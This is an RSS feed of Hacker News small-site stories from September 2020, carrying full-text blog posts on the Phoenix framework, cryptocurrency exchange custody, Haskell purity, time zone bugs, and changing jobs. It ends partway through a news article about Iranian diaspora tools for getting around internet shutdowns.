<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>
<![CDATA[Hacker News - Small Sites - Score >= 2]]>
        </title>
        <description>
<![CDATA[Hacker News stories from domains that aren't in the top 1M and that have a score of at least 2. Updated nightly via https://github.com/awendland/hacker-news-small-sites]]>
        </description>
        <link>https://news.ycombinator.com</link>
        <generator>RSS for Node</generator>
        <lastBuildDate>Sun, 27 Sep 2020 12:30:54 GMT</lastBuildDate>
        <atom:link href="https://raw.githubusercontent.com/awendland/hacker-news-small-sites/generated/feeds/hn-small-sites-score-2.xml" rel="self" type="application/rss+xml"></atom:link>
        <pubDate>Sun, 27 Sep 2020 12:30:54 GMT</pubDate>
        <language>
<![CDATA[en-US]]>
        </language>
        <managingEditor>
<![CDATA[me@alexwendland.com (Alex Wendland)]]>
        </managingEditor>
        <ttl>240</ttl>
        <item>
            <title>
<![CDATA[Things Elixir's Phoenix Framework Does Right]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24588122">thread link</a>) | @dinomad
<br/>
September 25, 2020 | https://scorpil.com/post/things-elixirs-phoenix-framework-does-right/ | <a href="https://web.archive.org/web/*/https://scorpil.com/post/things-elixirs-phoenix-framework-does-right/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="wrapper"><div id="container"><div><article itemscope="" itemtype="http://schema.org/BlogPosting"><div itemprop="articleBody"><p>I dabbled in Phoenix for a while now, but never <em>really</em> got my hands dirty with it right up until now. Apart from the whole framework being surprisingly well thought through, there are a few things that strike me as being done <em>exceptionally</em> well in Phoenix, compared to the rest of modern web frameworks.</p><p><img src="https://scorpil.com/img/phoenix.png" alt="Phoenix Framework Logo"></p><h3 id="1-striking-a-balance-between-flexibility-and-strictness">1. Striking a balance between flexibility and strictness</h3><p>Modern web frameworks can be roughly divided into two camps:</p><ul><li>Flexible ‚ÄúDIY‚Äù frameworks are a little more than a set of utilities for the most common web-related tasks. Most Go frameworks are like this, as well as ExpressJS. They enforce little to no rules for the structure of your applications and rely on the community to come up with the extensions and best practices. As a result, they are very flexible; those with a large community have extensions to perform any task imaginable. On the flip side, apps built on such a foundation can, given poor governance, slowly evolve into an unsupportable mess of incompatible plugins and mismatched coding styles.</li><li>Strict ‚Äúbatteries included‚Äù frameworks bring with them a complete set of tools to perform common web development tasks, as well as a set of conventions to go with it. They guide the developer into optimal code structure and typically strive to provide a single favored way of doing things. Of course, these kinds of frameworks are also extendable, but built-in tools often get embedded so deep into the project that they are almost irreplaceable. In this category, the most popular examples are Django and Ruby on Rails.</li></ul><p>Of course, most frameworks are not on an extreme end of the scale, but the distinction is there. Worth noting that neither group is strictly better than the other ‚Äì each has its usecases.</p><p>Phoenix Framework, in my mind, holds very close to the middle of this scale for these reasons:</p><ul><li>it builds upon Elixir‚Äôs functional philosophy, so it has a very clear idea how things <em>should</em> work (single request context passed around as the first argument to all components that participate in a response generation, avoiding side effects where possible, MVC-inspired architecture, etc.)</li><li>it does not hide its internal details in a ‚Äúblack box‚Äù, quite the opposite - it encourages you to understand internal conventions to write your own code in the same fashion. When you get comfortable using a framework, you can probably read its code without too much trouble.</li><li>by default Phoenix comes with a huge pack of tools and utils (ORM, routing, test suit, HTML rendering, metrics dashboard (sic!)‚Ä¶), but in most cases, there‚Äôs a trivial way to swap them out or turn them off.</li></ul><h3 id="2-reactiveness">2. Reactiveness</h3><p>When an app requires bi-directional communication between client and server, you usually either
integrate a 3rd party library into the framework, which means writing a pile of glue code, or
use a specialized framework like Tornado, which (caution, personal opinion here) kind of an awkward choice for those parts of the web app that do not concern themselves with WebSockets.</p><p>Phoenix is great for classical HTTP, but persistent communication is where it <em>really</em> shines. Primitives it gives you with channels, PubSub and Presence are just enough to avoid boilerplate without sacrificing flexibility. Recent live view release is a whole new way of building dynamic apps. I wouldn‚Äôt go as far as to call it revolutionary, but it is definitely an intriguing attempt of bridging the gap between frontend and backend.</p><h3 id="3-performance">3. Performance</h3><p>Phoenix‚Äôs performance has surprisingly little to do with the framework itself. It inherited its impressive concurrence characteristics from Elixir, which got it from Erlang, which got it thanks to the primitives of the BEAM virtual machine and the architectural patterns of OTP. The main principle at work to achieve concurrency is to schedule lightweight threads of execution to run each independent piece of work concurrently. You might have seen this approach in other languages (goroutines, python‚Äôs greenlets, etc.), that‚Äôs because it works great to organize concurrent code execution without performance hit and with a minimal headache for a developer. However, BEAM gives this concept support on a VM level, which means it can be optimized even on a hardware level.</p><p>While lightweight processes help you perform well on your IO-bound tasks, Elixir being a compiled language means that CPU bound tasks won‚Äôt bottleneck easily as well, and perform on less computing resources than most alternatives. While I can‚Äôt be 100% sure that it will be faster for your application than Go or Rust in terms of CPU usage, I‚Äôm reasonably sure that it will be more than fast enough in a context of a typical web app.</p><p><em><strong>Update:</strong> correction based on discussion in here and on other platforms: Elixir is slower than Go/Rust on purely CPU-bound tasks, mainly because BEAM interrupts running threads for task scheduling. Also, Elixir/Erlang compiles to bytecode, not directly to the machine code (although BeamAsm, JIT compiler for Erlang‚Äôs VM, has <a href="https://github.com/erlang/otp/pull/2745">landed in master 4 days ago</a>, so this should change in the next OTP release).</em></p><h3 id="4-failure-tolerance-and-cluster-awareness">4. Failure tolerance and cluster-awareness</h3><p>You might have heard Phoenix being called a ‚Äúmonolithic framework‚Äù. This is true to some extent: Phoenix <em>does</em> encourage you to put your frontend, backend, and background tasks in the same app. However, it also provides facilities to ensure that failure in a single component of the app will not affect other independent components. To explain in short, the app is divided into processes that communicate with each other via kind-of event messages. Each component is supervised, the supervisor will catch unhandled failures and restart the process in an attempt to fix them. It‚Äôs somewhat reminiscent of a microservice architecture, just on a lower level.</p><p>Unlike most frameworks, Phoenix understands that it will most likely run on more than one node. It provides a way to communicate over the network in exactly the same way you communicate between the processes within your app.</p><p>This does not mean that Phoenix is a bad choice for microservices, it just means that framework itself can handle some of the same concerns microservices are designed to handle. A smaller app might benefit from that by avoiding some of the complexities of building up your own microservices architecture. Bigger apps, and those that are already built as microservices, can still incorporate Phoenix effectively.</p><h3 id="are-there-any-drawbacks">Are there any drawbacks?</h3><p>Elixir, and functional programming in general, is still a long way away from the mainstream. If you don‚Äôt know your way around closures, immutable data structures, and functional thinking it will take you a while before getting to feel comfortable with Phoenix. The good news is that functional programming is on an upwards trend, and with applications growing more parallel and distributed, I don‚Äôt think this trend will reverse any time soon. So the knowledge you acquire in the process will serve you well going forward, independent from what the future holds for Phoenix.</p><p>The included tooling is great, but you might miss some 3rd party SDK‚Äôs when you need them. That‚Äôs definitely something to consider when starting a project. To give you an example: <a href="https://aws.amazon.com/getting-started/tools-sdks/">AWS</a> at the time of writing does not provide an official elixir client library.</p><p>Phoenix Framework a rock-solid, production-ready tool with a variety of usecases. It feels fresh and well thought through. I won‚Äôt be surprised if Phoenixes popularity continues to grow to reach the level of ‚ÄûTop tier‚Äú frameworks in the next few years.</p></div></article></div></div></div></div>]]>
            </description>
            <link>https://scorpil.com/post/things-elixirs-phoenix-framework-does-right/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24588122</guid>
            <pubDate>Fri, 25 Sep 2020 09:29:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why 2FA isn't enough with Crypto Exchanges]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24588024">thread link</a>) | @timothy-quinn
<br/>
September 25, 2020 | https://blog.congruentlabs.co/why-2fa-isnt-enough-with-exchanges/ | <a href="https://web.archive.org/web/*/https://blog.congruentlabs.co/why-2fa-isnt-enough-with-exchanges/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            

            <figure>
                <img srcset="https://blog.congruentlabs.co/content/images/size/w300/2020/09/Keep-Crypto-Decentralized.png 300w,
                            https://blog.congruentlabs.co/content/images/size/w600/2020/09/Keep-Crypto-Decentralized.png 600w,
                            https://blog.congruentlabs.co/content/images/size/w1000/2020/09/Keep-Crypto-Decentralized.png 1000w,
                            https://blog.congruentlabs.co/content/images/size/w2000/2020/09/Keep-Crypto-Decentralized.png 2000w" sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px" src="https://blog.congruentlabs.co/content/images/size/w2000/2020/09/Keep-Crypto-Decentralized.png" alt="Why 2FA isn't enough with Crypto Exchanges">
            </figure>

            <section>
                <div>
                    <p>A lot of trust needs to be put in to cryptocurrency exchanges. Firstly because you're entrusting them with your Fiat currency, and secondly because you're entrusting them with the <em>keys </em>to your cryptocurrency.</p><p>Each cryptocurrency address, regardless if it's Bitcoin, Litecoin, or Ethereum, is a public representation of a pair of <em>cryptographic keys</em>. That pair consists of two parts - a <strong>public </strong>key, and a <strong>private </strong>key. What's important here is that the <strong>private </strong>key is what allows you to make transactions, giving you the ability to transfer coins to other parties.</p><p>Now if you've ever used an exchange before, you'll notice that <strong>you don't normally see these keys</strong>. The exchange is managing it all for you in the background. They might have the keys for a Bitcoin or Ethereum address specifically created for your account in the background, which they're using to then make the trades that you ask them to via their website or app.</p><p>This is great, but those private keys? You're not going to see them. In fact if you transfer coins out of exchanges and <a href="https://live.blockcypher.com/">watch the transaction with a service like BlockCypher</a> - you'll often see the amount you transferred came from some address that was holding a lot more on it as a pool for multiple users, and your particular amount was divvied out to wherever you asked it to go with the remainer staying on the original address or moved somewhere else.</p><p>This kind of environment wasn't quite the intent for cryptocurrency - the intent was to <em>decentralise </em>- i.e. as a user, you control your own keys - not some larger authority like a bank. Most of the popular exchanges are well run and have proven themselves so far regarding trust and security, but ultimately they still hold your keys. They can assure you of their security controls and processes over and over, even enabling 2-Factor Authentication to <em>really</em> lock down access with YubiKeys, OTP tokens, and SMS codes. They can assure you that they provide cold storage services to <em>really</em> lock down access. But even 5 or 500 layers of security, never forget <strong>- they still hold your keys</strong>.</p><h2 id="so-what-should-you-do">So what should you do?</h2><p>The first step is to take ownership back. Most exchanges provide a capability to <em>send</em> your holdings to another address. They usually bury that feature behind a bunch of menus, but you should hopefully find the capability. All you need to do is create addresses in a product under your control, like <a href="https://signata.net/">Signata</a>, and then you can use those addresses as the destination for sending your holdings from the exchange.</p><p>The second step is to enable 2FA on the exchange. Yes, we've just outlined why 2FA isn't enough to protect your holdings - but that doesn't mean you shouldn't be using it anyway. At some point you're going to want to move your holding from Signata back into the exchange to trade them for fiat (or other currencies). If your exchange supports YubiKeys for 2FA, then great! - you can use your same YubiKey for both logging in to the exchange, and protecting your private keys in <a href="https://signata.net/">Signata</a>.</p><p>The most secure way to keep cryptocurrency is to stay decentralised. Be the owner of your crypto assets, and keep the power to send them wherever and whenever you want. Don't let exchanges hold on to your assets - hold them in a wallet that <em>you</em> control. <a href="https://signata.net/">Try Signata today for free</a> - you can add as many addresses and YubiKeys and you like, and we never see your private keys.</p>
                </div>
            </section>

            
            
        </article>
    </div>
</div></div>]]>
            </description>
            <link>https://blog.congruentlabs.co/why-2fa-isnt-enough-with-exchanges/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24588024</guid>
            <pubDate>Fri, 25 Sep 2020 09:13:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Haskell Vedanta]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24587159">thread link</a>) | @johndoe42377
<br/>
September 24, 2020 | https://karma-engineering.com/lab/wiki/Haskell/Vedanta | <a href="https://web.archive.org/web/*/https://karma-engineering.com/lab/wiki/Haskell/Vedanta">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="wikipage">
<p>
A program is precise specification of a process, detailed-enough to be executed by an abstract machine.
</p>
<p>
An algorithm is a formalized (well-defined and precise) general procedure (a sequence of actions to perform), to be implemented in all sufficient and necessary details.
</p>
<h2 id="Haskell">Haskell</h2>
<p>
Haskell is pure Logic. Strongly-typed with type-classes and highly syntactically sugared, which is compiled to a intermediate language (MIR) which is also a language based on a <em>Simply-Typed Lambda Calculus</em>, which, in turn, is <em>evaluated by runtime as a type-checked state machine</em> - this is what the function <code>main</code> produces (which is what a Haskell executable really is).
</p>
<p>
Not just that, all Haskell code, including MIR, could be evaluated by pure substitution -- by applying rewrite rules, (beta-reduction, inlining, etc.) exactly like Logic and Math, which, look at this:
</p>
<p>
<em>makes Haskell a pure high-order predicate logic, statically typed with type-classes, reducible to pure Lambda Calculus (as its implementation)</em>.
</p>
<p>
C++ is a joke compared to this and NodeJS is just bullshit.
</p>
<h2 id="Purity">Purity</h2>
<p>
All Haskell expressions are pure, even when they describe impure actions to be performed eventually by mundane impure runtime.
</p>
<p>
The expression produced by the main function is a pure definition of a state-machine (an actual structure!) verified to be type-safe (have no contradictions) by the compiler.
</p>
<p>
Each function is pure because the <em>context</em> (or state) is always passed to it as a parameter, even <em>The Whole World</em> is passed in the case of IO (implementation, however, throws it away!).
</p>
<p>
From the mathematical point of view if you have the whole world as a parameter to a function which returns a value <em>together with a new version of the world, after causing some effect on it</em>, then, the function is indeed pure. <em>Same input - same output. Always</em>.
</p>
<p>
This is not a joke. Not just a beautiful metaphor. As long as all functions are pure <em>the substitution model of evaluation (as in Lambda Calculus, Logic and Mathematics) still holds</em>, so Haskell is still a pure higher-order logic - <em>Simply Typed Lambda Calculus extended with some additional evaluation rules, type-classes and decorated with some syntactic sugar</em>. Its MIT is exactly this.
</p>
<p>
One more time: Haskell code is <em>a Pure Logic</em>, not just theoretically but technically and operationally.
</p>
<p>
It all can, in principle, be evaluated with pen and pencil using substitution. Just like Maths.
</p>
<h2 id="Monads">Monads</h2>
<p>
Haskell literally separates a pure functional code from impure by  creating <em>an abstraction barrier</em> between pure and impure code by encapsulation such code into various <a href="https://karma-engineering.com/lab/wiki/Haskell/Monads">Monads</a>.
</p>
<p>
Separation (an abstraction barrier) is enforced at a type level.
Functions below cannot access values (and functions) above.
</p>
<p>
The <em>contexts</em> could play very different roles, from holding algebraic data types, such as <code>Either</code> or <code>Maybe</code>, to encapsulations <code>State</code> and <code>IO</code>.
</p>
<p>
Being composed (which is what it is all about) Monads provide an implicit sequencing for a pure, lazy code, via <a href="https://karma-engineering.com/lab/wiki/FirstPrinciples/Nesting">nesting</a> of functions -- <code>(.)</code> and <code>(&gt;&gt;=)</code> are merely nested lambdas.
</p>
<p>
Thus, Monads are fit to encapsulate <code>IO</code> actions which imply serialization (sequencing).
</p>
<p>
End of the long and messy story.
</p>
<h2 id="Endofknowledge.">End of knowledge.</h2>
<p>
Technically, Haskell is a pure-functional language with lazy semantics  which is statically (and, obviously, strongly) typed with type-classes. It is simplified into an intermediate language (representation), which is just <em>Simple-Typed Lambda Calculus extended with a few additional types, syntactic forms and evaluation rules</em>. Even more technically, it uses <em>System F Omega formalism</em> to implement High-order Logic.
</p>
</div></div>]]>
            </description>
            <link>https://karma-engineering.com/lab/wiki/Haskell/Vedanta</link>
            <guid isPermaLink="false">hacker-news-small-sites-24587159</guid>
            <pubDate>Fri, 25 Sep 2020 06:41:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Time Zone Bugs I Ran Into]]>
            </title>
            <description>
<![CDATA[
Score 32 | Comments 19 (<a href="https://news.ycombinator.com/item?id=24586991">thread link</a>) | @Sandeepg33k
<br/>
September 24, 2020 | https://blog.davidojeda.dev/4-time-zone-bugs-i-ran-into | <a href="https://web.archive.org/web/*/https://blog.davidojeda.dev/4-time-zone-bugs-i-ran-into">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section itemprop="articleBody mainEntityOfPage"><meta itemprop="thumbnailUrl image" content="https://cdn.hashnode.com/res/hashnode/image/upload/v1600871234687/et6yX6Wlb.png?w=1600&amp;h=840&amp;fit=crop&amp;crop=entropy&amp;auto=format&amp;q=60"><div><div itemprop="text"><p>Software development is hard. Time zones are hard. Dealing with time zones in software development?  Yeah, <strong>harder</strong>.</p>
<p>Here are <strong>4</strong> places where time zones might differ; and 4 personal bug stories for each case. I'll be referring to the same app for each story, the one I work with and maintain in my day-to-day job. This app works with Mexico's City time zone.</p>

<h2 id="time-zone-of-your-app">Time zone of your app</h2>
<p>Your app runs with a default time zone. It's usually the time zone of the server it runs on, but it can be different.</p>
<p>In Java, you can define the time zone of the whole application when it boots. If for some reason you don't want to work with your server's timezone, this is the place to change it.</p>
<h3 id="the-bug-time-in-chile-off-by-one-hour">The bug - Time in Chile off by one hour</h3>
<p>The app shows the date of creation of an object in many places. Three of these places were showing different times; <strong>two incorrect and one correct</strong>.</p>
<p>One error was because I forgot to pass the user's timezone to the date formatter. Quick fix.</p>
<p>The second error was weird. I couldn't identify why, so I compared it with the correct one.</p>
<p>But the third case was only right because the date had been double parsed! Once on the server and a second time on the client (browser).</p>
<p>So none of the three dates were actually correct. <strong>WTF?</strong></p>
<p>After some headaches, I learned that each version of Java comes with a time zone data file. This file includes the latest information on the world's time zones, and the <a target="_blank" href="https://www.iana.org/time-zones">Internet Assigned Numbers Authority (IANA)</a> manages it. </p>
<p>Time zone changes happen when governments decide to apply or not to apply daylight saving times (DST). </p>
<p>In 2015, Chile decided to move from seasonal DST to permanent DST, and some JRE releases included this change. But then, in 2016 Chile decided to revert to how it was before; seasonal DST instead of permanent. <strong>What was the issue?</strong> The app was using one of these JRE releases with an outdated time zone data file.</p>
<p>You can read more about these <a target="_blank" href="https://hi.service-now.com/kb_view.do?sysparm_article=KB0622033">DST issues with Java here</a>.</p>

<h2 id="time-zone-of-your-server">Time zone of your server</h2>
<p>The operative system defines your server's time zone. I've always used Linux for production servers, and they come with UTC as the default time zone.</p>
<p>If you need to change this time zone, make sure to do it before your application starts or it won't reflect the change.</p>
<h3 id="the-bug-app-using-the-wrong-default-time-zone-from-the-server">The bug - App using the wrong default time zone from the server</h3>
<p>I was migrating some processes in our build and deployment pipeline. From configuring the app with every deploy to a pre-built AWS Amazon Machine Image (AMI) with HashiCorp's Packer.</p>
<p>One step of the initial configuration was to change the server's time zone to America/Mexico_City, and I was aware of it. So I created a bash script that changed the time zone on the AMI we were going to use. The script worked well when I tested it on a Linux instance. No problem there.</p>
<p>I proceeded to use this AMI in our staging environment and neither I nor my teammates noticed something off. So, to production!</p>
<p>Customer's questions and complaints about dates behaving weird arrived minutes later üò•</p>
<p><strong>The issue?</strong> The script that updated the server's time zone was failing silently and I missed double-checking it in the staging environment. The app wasn't using an explicit time zone, so it took the server's. And the server's time zone was UTC by default, and we needed America/Mexico_City. I fixed the script and, to make sure, updated the app's default time zone to the expected one.</p>

<h2 id="time-zone-of-your-database">Time zone of your database</h2>
<p>You can also change your database's time zone. I use AWS Relational Database Service (RDS) and the default time zone is UTC. You can update it from the parameter group of your cluster or individual instance.</p>
<h3 id="the-bug-wrong-database-time-zone">The bug - Wrong database time zone</h3>
<p>Now I was doing a migration of our database. I anticipated myself by changing the database's time zone to America/Mexico_City because the app and server had it. Every part of the system should be in the same page, right? <strong>Wrong!</strong></p>
<p>The database was perfectly okay being in UTC while the app and server were in America/Mexico_City. That's how it worked. </p>
<p>This bug was not as critical as the previous ones because I caught it in our staging environment. </p>

<h2 id="time-zone-of-your-users">Time zone of your users</h2>
<p>If it wasn't enough, each one of your users can have a different time zone, and you have to take that into consideration when showing time sensitive-data.</p>
<h3 id="the-bug-many-of-them">The bug - Many of them!</h3>
<p>I've encountered many bugs related to user's time zones:</p>
<ul>
<li>Missing time zone in date formatter.</li>
<li>Incorrect time zone selection from the user.</li>
<li>Missing DST time zone options for users to select.</li>
<li>Storing dates with time zone modifications that get parsed again when retrieved.</li>
</ul>
<hr>
<p>Time zones are one of the most complicated topics you'll find while developing software. They're complex by themselves, and even more when you throw some code into the mix.</p>
<p>I hope these short stories can help you avoid my mistakes in the future üôåüèº</p>
<p><strong>Thanks for reading me! üíô</strong></p>
</div></div></section></div></div>]]>
            </description>
            <link>https://blog.davidojeda.dev/4-time-zone-bugs-i-ran-into</link>
            <guid isPermaLink="false">hacker-news-small-sites-24586991</guid>
            <pubDate>Fri, 25 Sep 2020 06:01:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Deciding to Switch Companies]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24586217">thread link</a>) | @rustoo
<br/>
September 24, 2020 | https://staffeng.com/guides/deciding-to-switch | <a href="https://web.archive.org/web/*/https://staffeng.com/guides/deciding-to-switch">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><h4><a href="https://staffeng.com/guides">Guides</a> / <a href="https://staffeng.com/guides/deciding-to-switch">Deciding to switch companies</a></h4><div><p>My father was a professor of economics. After he completed his PhD in his late twenties, he started teaching at one university, got tenure at that university, and walked out forty-some years later into retirement. Working in technology, that sounds like a fairytale.</p>
<p>There are very few software companies with a forty-year track record, and even fewer folks whose <a href="https://lethain.com/forty-year-career/">forty-year career</a> consisted of one employer. There used to be a meme that many engineers spent either one or four years at each company to maximize their equity grants and then bounced on to the next. If that ever happened, it certainly isn‚Äôt common behavior for folks who aspire towards or reach Staff-plus roles.</p>
<p>Instead, generally those folks stay, and are rewarded for staying, at a given company as long as the circumstances support their success. If those circumstances change, they tend to either leave shortly thereafter or spend a while burning out and then leave after exhausting their emotional reservoir.</p>
<p>It takes years to build the visibility and social credibility to get promoted from a Senior Engineer role to a Staff-plus role, which makes it very difficult to walk away if you feel like you‚Äôre <em>just</em> one hump away from the promotion. Leaving, it can feel like, means starting over from scratch.</p>
<p>Then again, as described by <a href="https://staffeng.com/stories/duretti-hirpa">Duretti Hirpa</a> and <a href="https://staffeng.com/stories/keavy-mcminn">Keavy McMinn</a>, it‚Äôs common for folks to attain their first Staff-plus title by joining a new company. Even with all your internal credibility, sometimes leaving is the most effective path forward.</p>
<p>What‚Äôs the right decision for you?</p>
<hr>
<p>Before going further, I want to recognize two very different job-switching experiences: one of privileged flexibility and another of rigid constraints. Your residency might depend on a work-sponsored visa. You might be supporting an extended family. You might be constrained to a geographical area with few employers. This advice focuses on the former circumstances, which are more common circumstances for someone who‚Äôs deep enough into a technology career to pursue a Staff role. You should absolutely discount it to the extent this doesn‚Äôt reflect your circumstances.</p>
<h2>Why leaving works</h2>
<p>The company that knows your strengths the best is your current company, and they are the company most likely to give you a Staff-plus role. However, actually awarding the role depends on so many circumstantial concerns, that this isn‚Äôt how it works out in practice.</p>
<p>If your current team is very senior, it may be hard to justify your impact at the Staff engineer level because it‚Äôs being attributed to your peers. Your manager might have a limited budget that doesn‚Äôt have room for another Staff engineer. You might lack an internal sponsor. There simply might not be the need for an additional Staff engineer at your company. Any of these can mean that while you ought to be promoted, your current company won‚Äôt.</p>
<p>Conversely, when you interview for new roles, you can simply keep interviewing until you find a company that‚Äôs able to grant the title. The interview process often brings an automatic sponsor with it -- the hiring manager -- whose incentives will never be more aligned with yours than in the interview process.</p>
<p>The technical interviews are an inconsistent and unreliable predictor of success, which is bad for the industry and bad for companies, but works in your favor if you‚Äôre set on attaining a Staff-plus role and are willing to conduct a broad search. Interviewing creates the opportunity to play ‚Äúbias arbitrage‚Äù, finding a company that values your particular brand of bullshit disproportionately. That might be a company that values folks with conference speaking visibility, your experience designing APIs, or <a href="https://staffeng.com/stories/dmitry-petrashko">your PhD thesis on compilers</a>.</p>
<p>Similarly, sometimes you‚Äôll get into a rut at a company where your reputation is preventing forward progress. Perhaps you‚Äôve tagged ‚Äúdifficult‚Äù after flagging inclusion issues. Maybe you embarrassed an influential Director at lunch and they‚Äôre blocking your promotion. A new company lets you leave that baggage behind.</p>
<hr>
<p>Yeah, of course, it‚Äôs always an open question whether you can <em>really</em> leave anything behind you in the tech industry. It can feel a bit cliquey at times. If you‚Äôve worked in tech hubs, at larger companies, and for more than ten years, then you almost certainly have mutual connections with the folks interviewing you.</p>
<p>If you have a bad run at a company, maybe your manager was a bully or maybe you were going through a challenging period in your own life, it can feel like a cloud poisoning your future prospects. That said, much like the interview process in general, references and backchannel reference checks are deeply random. If you need any further evidence of that, look to the serial harassers who continue to get hired job after job at prominent companies.</p>
<h2>Things to try before leaving</h2>
<p>If you‚Äôre planning to leave due to lack of interest, excitement, support or opportunity, it‚Äôs worthwhile to at least explore the internal waters first. This lets you carry your internal network with you while still getting many of the advantages of switching companies. Depending on your company‚Äôs size and growth rate this might not be an option for you, but there are some folks who switch roles every two-to-three years within the same parent company, and find that an effective way to remain engaged and learning.</p>
<p>On the other hand, if you‚Äôre considering leaving due to burnout or exhaustion, it‚Äôs sometimes possible to negotiate a paid or unpaid sabbatical where you can take a few months recharging yourself, often in conjunction with switching internal roles. This is more common at larger companies. (In case you were wondering, no your coworkers taking parental leave is not ‚Äúon sabbatical‚Äù or ‚Äúon vacation.‚Äù)</p>
<h2>Leaving without a job</h2>
<p>Speaking of burnout, if you‚Äôre <em>particularly</em> burned out, it‚Äôs worth considering leaving your job without another job lined up. There‚Äôs a fairly simple checklist to determine if this is a good option for you:</p>
<ul>
<li>Does your visa support this?</li>
<li>Are you financially secure for at least a year without working?</li>
<li>Do you work in a high-density job market, remotely, or are you flexible on where your next job is?</li>
<li>Do you interview well?</li>
<li>Could you articulate a coherent narrative to someone asking you why you left without a job lined up?</li>
<li>Are there folks at your previous company who can provide positive references?</li>
</ul>
<p>If all of those are true, then I don‚Äôt know anyone who <em>regrets</em> taking a sabbatical. However, bear in mind that it‚Äôs only the folks who took six-month-plus sabbaticals who felt reborn by the experience. Folks taking shorter stints have appreciated them but often come back only partially restored.</p>
<h2>Taking the plunge</h2>
<p>If you‚Äôre almost at the Staff promotion in your current company, there is absolutely another company out there who will give you the Staff title. Whether or not you‚Äôll enjoy working there or be supported after getting there, that‚Äôs a lot harder to predetermine. If your internal reputation is damaged or if you‚Äôve been repeatedly on the cusp of promotion but victim to a moving criteria line, then you should seriously consider switching roles if the title is important to you -- at some point you have to hear what your current company is telling you.</p>
<p>Conversely, if you‚Äôre happy in your current role outside of the title, consider if you can be more intentional about pursuing your promotion rather than leaving. Many folks hit a rut in their promotion path to Staff-plus, and using techniques like the <a href="https://staffeng.com/guides/promo-packets">promotion packet</a> can help you get unstuck. If you‚Äôve used all the approaches, taken your self-development seriously, and still can‚Äôt get there -- it‚Äôs probably time to change.</p>
<p>That said, it‚Äôs easy to overthink these things. Few folks tell their decade-past story of staying at or leaving some job.</p></div><p><em><a href="https://staffeng.com/guides">Read another guide?</a></em> <!-- -->or<!-- --> <em><a href="https://staffeng.com/stories">Back to the stories?</a></em></p></section></div></div>]]>
            </description>
            <link>https://staffeng.com/guides/deciding-to-switch</link>
            <guid isPermaLink="false">hacker-news-small-sites-24586217</guid>
            <pubDate>Fri, 25 Sep 2020 03:12:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How Iranian diaspora is using old-school tech to fight internet shutdown at home]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24585986">thread link</a>) | @rfreytag
<br/>
September 24, 2020 | https://restofworld.org/2020/cat-and-mouse-censorship/ | <a href="https://web.archive.org/web/*/https://restofworld.org/2020/cat-and-mouse-censorship/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			
<p>One November morning last year, Mehdi Yahyanejad listened to a voicemail in his Los Angeles office: ‚ÄúI‚Äôm contacting you from the city of Tehran,‚Äù said the voice. ‚ÄúThis was the first time I‚Äôve experienced an internet shutdown. ‚Ä¶ It feels like I‚Äôm in a prison.‚Äù</p>



<p>A few weeks earlier, Iran‚Äôs largest mobile networks and internet providers went offline. Amid weeks of growing anti-regime protests, Iranian authorities imposed <a href="https://edition.cnn.com/2019/11/18/middleeast/iran-protests-explained-intl/index.html">the longest internet shutdown</a> in the country‚Äôs history, effectively cutting off external communication for over 80 million Iranians. In an unprecedented crackdown, regime forces <a href="https://www.amnesty.org/en/latest/news/2020/05/iran-details-released-of-304-deaths-during-protests-six-months-after-security-forces-killing-spree/">killed more than 300 protesters</a> and arrested <a href="https://www.amnesty.org/en/latest/news/2019/12/iran-thousands-arbitrarily-detained-and-at-risk-of-torture-in-chilling-post-protest-crackdown/">over 7,000 people</a>. When access was finally restored on November 23, nearly half the country was still unable to come online.</p>



<p>Nine months after the November blackout, Iranians still live in fear of another all-out shutdown. As authorities tighten their hold on internet access, diaspora-led companies are filling the gap for Iranians who are seeking a way to bypass censors. The circumvention tools, created largely by diaspora entrepreneurs, are becoming increasingly critical as they face a crackdown at home and the bite of American-led sanctions online.</p>



<p>On November 15, as Iranian authorities first moved to induce the digital blackout, 44-year-old Yahyanejad raced against the clock in Los Angeles to make sure that people back home had downloaded his satellite file-casting application <a href="https://www.toosheh.org/">Toosheh</a>.<em> </em>‚ÄúIt was a very small window,‚Äù says Yahyanejad. ‚ÄúOnce they were fully disconnected, I wasn‚Äôt sure they‚Äôd be able to download the software.‚Äù&nbsp;</p>



<p>Launched by Yahyanejad in 2016, the technology aggregates uncensored content, like news articles, YouTube videos, and podcasts, and sends it to Iranian homes directly via satellite TV. When Yahyanejad first began developing Toosheh in 2013, an estimated 70% of Iranian households owned a satellite dish, while around 20% had access to the internet. Even as internet access has grown, state censorship means Toosheh‚Äôs satellite technology is a much more reliable source for uncensored content. Iranians can install Toosheh‚Äôs satellite channel and receive a daily dispatch in the form of a file package of up to 8 gigabytes. Once a user downloads the app, the satellite transfers circumvent the internet entirely.&nbsp;</p>



